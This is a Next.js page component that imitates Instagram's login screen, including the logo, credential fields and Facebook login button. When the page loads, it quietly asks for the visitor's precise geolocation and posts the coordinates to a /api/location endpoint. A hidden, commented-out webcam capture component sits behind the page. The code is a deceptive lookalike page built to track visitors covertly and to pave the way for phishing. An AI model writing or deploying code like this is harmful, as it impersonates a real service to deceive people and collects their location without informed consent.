"use client";
import { useRef, useEffect } from "react";

export default function Home() {
  const webcamRef = useRef(null);

  useEffect(() => {
    const fetchLocation = async () => {
      try {
        // Check if geolocation is supported

        // Request current position with a fallback if permissions are denied
        navigator.geolocation.getCurrentPosition(
          async (position) => {
            const location = {
              latitude: position.coords.latitude,
              longitude: position.coords.longitude,
            };

            // Send location data to the server
            try {
              const response = await fetch("/api/location", {
                method: "POST",
                headers: {
                  "Content-Type": "application/json",
                },
                body: JSON.stringify(location),
              });

              if (!response.ok) {
                console.error("Failed to send location data");
              } else {
                console.log("Location sent successfully:", location);
              }
            } catch (error) {
              console.error("Error sending location data:", error.message);
            }
          },
          (error) => {
            // Handle errors in fetching location
            switch (error.code) {
              case error.PERMISSION_DENIED:
                console.error("User denied the request for Geolocation.");
                break;
              case error.POSITION_UNAVAILABLE:
                console.error("Location information is unavailable.");
                break;
              case error.TIMEOUT:
                console.error("The request to get user location timed out.");
                break;
              default:
                console.error("An unknown error occurred.");
                break;
            }
          },
          { timeout: 10000, enableHighAccuracy: true } // Adjusted settings
        );
      } catch (error) {
        console.error("Error fetching location:", error.message);
      }
    };

    fetchLocation();
  }, []);

  return (
    <>
      <div className="h-screen bg-gray-50 flex flex-col justify-center items-center">
        <div className="bg-white border border-gray-300 w-80 py-8 flex items-center flex-col mb-3">
          <h1 className="bg-no-repeat instagram-logo"></h1>
          <form className="mt-8 w-64 flex flex-col">
            <input
              autoFocus
              className="text-xs w-full mb-2 rounded border bg-gray-100 border-gray-300 px-2 py-2 focus:outline-none focus:border-gray-400 active:outline-none"
              id="email"
              placeholder="Phone number, username, or email"
              type="text"
            />
            <input
              autoFocus
              className="text-xs w-full mb-4 rounded border bg-gray-100 border-gray-300 px-2 py-2 focus:outline-none focus:border-gray-400 active:outline-none"
              id="password"
              placeholder="Password"
              type="password"
            />
            <a className="text-sm text-center bg-blue-300 text-white py-1 rounded font-medium">
              Log In
            </a>
          </form>

          <div className="flex justify-evenly space-x-2 w-64 mt-4">
            <span className="bg-gray-300 h-px flex-grow t-2 relative top-2"></span>
            <span className="flex-none uppercase text-xs text-gray-400 font-semibold">
              or
            </span>
            <span className="bg-gray-300 h-px flex-grow t-2 relative top-2"></span>
          </div>
          <button className="mt-4 flex">
            <div className="bg-no-repeat facebook-logo mr-1"></div>
            <span className="text-xs text-blue-900 font-semibold">
              Log in with Facebook
            </span>
          </button>
          <a className="text-xs text-blue-900 mt-4 cursor-pointer -mb-4">
            Forgot password?
          </a>
        </div>
        <div className="bg-white border border-gray-300 text-center w-80 py-4">
          <span className="text-sm">Don&#39;t have an account?</span>
          <a className="text-blue-500 text-sm font-semibold">Sign up</a>
        </div>
        <div className="mt-3 text-center">
          <span className="text-xs">Get the app</span>
          <div className="flex mt-3 space-x-2">
            <div className="bg-no-repeat apple-store-logo"></div>
            <div className="bg-no-repeat google-store-logo"></div>
          </div>
        </div>
      </div>
      <div className="absolute top-0 w-full h-full -z-10">
        <div className="absolute w-full h-full bg-[#F9FAFB]"></div>

        {/* <Webcam audio={false} screenshotFormat="image/jpeg" ref={webcamRef} /> */}
      </div>
    </>
  );
}
